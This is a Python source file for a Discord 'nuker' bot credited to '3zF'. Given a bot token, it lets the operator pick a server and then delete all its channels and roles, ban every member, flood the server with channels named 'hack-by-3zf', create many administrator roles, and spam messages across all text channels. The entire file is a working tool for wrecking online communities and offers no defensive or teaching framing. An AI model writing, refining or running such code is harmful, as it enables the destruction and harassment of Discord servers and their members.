import discord, asyncio, sys, os, random, time
from discord.ext import commands
from colorama import init, Fore, Style
init(autoreset=True)
os.system("cls||clear")
B=Fore.RED+"""
╔══════════════════════════════════════════════════════╗
║██████╗  ██████╗ ███████╗███████╗                    ║
║╚════██╗██╔═████╗██╔════╝██╔════╝                    ║
║ █████╔╝██║██╔██║███████╗███████╗                    ║
║ ╚═══██╗████╔╝██║╚════██║╚════██║                    ║
║██████╔╝╚██████╔╝███████║███████║                    ║
║╚═════╝  ╚═════╝ ╚══════╝╚══════╝                    ║
╚══════════════════════════════════════════════════════╝
╔══════════════════════════════════════════════════════╗
║               Developer by 3zF                     ║
╚══════════════════════════════════════════════════════╝
"""
print(B)
token=input(Fore.RED+" [TOKEN] > "+Fore.WHITE)
intents=discord.Intents.all()
client=commands.Bot(command_prefix="!",intents=intents,help_command=None)
gt=None
r=True
CN=["hack-by-3zf","nuker-by-3zf","destroyed-by-3zf"]
RN=["3zf-admin","3zf-owner","3zf-hacker"]
@client.event
async def on_ready():
 global gt
 os.system("cls||clear")
 print(B)
 print(Fore.RED+"╔══════════════════════════════════════════════════════╗")
 print(Fore.RED+"║"+Fore.WHITE+"           ✅ "+str(client.user)+Fore.RED+"           ║")
 print(Fore.RED+"╚══════════════════════════════════════════════════════╝")
 gs=list(client.guilds)
 for i,g in enumerate(gs):print(Fore.RED+" ["+Fore.WHITE+str(i+1)+Fore.RED+"] "+Fore.WHITE+g.name+Fore.RED+" ["+Fore.WHITE+str(g.id)+Fore.RED+"]")
 while True:
  try:
   c=int(input(Fore.RED+"\n [SERVER] > "+Fore.WHITE))-1
   if 0<=c<len(gs):gt=gs[c];break
  except:pass
 while r:
  os.system("cls||clear")
  print(B)
  print(Fore.RED+"╔══════════════════════════════════════════════════════╗")
  print(Fore.RED+"║"+Fore.WHITE+"               "+gt.name+Fore.RED+"               ║")
  print(Fore.RED+"╚══════════════════════════════════════════════════════╝")
  print(Fore.RED+"┌──────────────────────┬──────────────────────┐")
  print(Fore.RED+"│"+Fore.WHITE+"  [01] DEL CH        "+Fore.RED+"│"+Fore.WHITE+"  [05] DEL ROL      "+Fore.RED+"│")
  print(Fore.RED+"├──────────────────────┼──────────────────────┤")
  print(Fore.RED+"│"+Fore.WHITE+"  [02] MAKE CH        "+Fore.RED+"│"+Fore.WHITE+"  [06] MAKE ROL     "+Fore.RED+"│")
  print(Fore.RED+"├──────────────────────┼──────────────────────┤")
  print(Fore.RED+"│"+Fore.WHITE+"  [03] BAN ALL        "+Fore.RED+"│"+Fore.WHITE+"  [07] SPAM        "+Fore.RED+"│")
  print(Fore.RED+"├──────────────────────┼──────────────────────┤")
  print(Fore.RED+"│"+Fore.WHITE+"  [04] RENAME         "+Fore.RED+"│"+Fore.WHITE+"  [08] EXIT        "+Fore.RED+"│")
  print(Fore.RED+"└──────────────────────┴──────────────────────┘")
  c=input(Fore.RED+" > "+Fore.WHITE).strip()
  if c in["1","01"]:
   n=[0]
   async def d(ch):
    try:await ch.delete();n[0]+=1
    except:pass
   await asyncio.gather(*[d(ch) for ch in list(gt.channels)])
   print(Fore.GREEN+" DONE "+str(n[0])+" CH");time.sleep(1)
  elif c in["2","02"]:
   try:num=int(input(Fore.RED+" COUNT > "+Fore.WHITE))
   except:continue
   n=[0]
   async def m(i):
    try:await gt.create_text_channel(CN[i%3]);n[0]+=1
    except:pass
   for i in range(0,num,10):await asyncio.gather(*[m(i+j) for j in range(min(10,num-i))])
   print(Fore.GREEN+" DONE "+str(n[0])+" CH");time.sleep(1)
  elif c in["3","03"]:
   if input(Fore.RED+" BAN? (y/n) > "+Fore.WHITE).lower()!="y":continue
   await gt.fetch_members()
   n=[0]
   async def b(m):
    if m.id!=client.user.id:
     try:await m.ban(reason="3zF");n[0]+=1
     except:pass
   mems=list(gt.members)
   for i in range(0,len(mems),5):await asyncio.gather(*[b(m) for m in mems[i:i+5]])
   print(Fore.GREEN+" DONE "+str(n[0])+" MEM");time.sleep(1)
  elif c in["4","04"]:
   try:await gt.edit(name=input(Fore.RED+" NAME > "+Fore.WHITE));print(Fore.GREEN+" DONE")
   except:print(Fore.RED+" X");time.sleep(1)
  elif c in["5","05"]:
   n=[0]
   async def rr(role):
    if role.name not in["@everyone",gt.name]:
     try:await role.delete();n[0]+=1
     except:pass
   await asyncio.gather(*[rr(r) for r in gt.roles])
   print(Fore.GREEN+" DONE "+str(n[0])+" ROL");time.sleep(1)
  elif c in["6","06"]:
   try:num=int(input(Fore.RED+" COUNT > "+Fore.WHITE))
   except:continue
   n=[0]
   async def mr(i):
    try:await gt.create_role(name=RN[i%3],color=discord.Color(random.randint(0,0xFFFFFF)),permissions=discord.Permissions(administrator=True),hoist=True);n[0]+=1
    except:pass
   for i in range(0,num,5):await asyncio.gather(*[mr(i+j) for j in range(min(5,num-i))])
   print(Fore.GREEN+" DONE "+str(n[0])+" ROL");time.sleep(1)
  elif c in["7","07"]:
   try:cc=int(input(Fore.RED+" MSG COUNT > "+Fore.WHITE))
   except:continue
   msg=input(Fore.RED+" MSG > "+Fore.WHITE)
   chs=[ch for ch in gt.text_channels if ch.permissions_for(gt.me).send_messages]
   if not chs:continue
   n=[0]
   async def s(ch):
    for _ in range(cc):
     try:await ch.send(msg);n[0]+=1
     except:pass
   await asyncio.gather(*[s(ch) for ch in chs])
   print(Fore.GREEN+" DONE "+str(n[0])+" MSG");time.sleep(1)
  elif c in["8","08"]:r=False;print(Fore.RED+" BYE");await client.close();break
try:client.run(token)
except:print(Fore.RED+" X TOKEN");time.sleep(2);os.execl(sys.executable,sys.executable,*sys.argv)
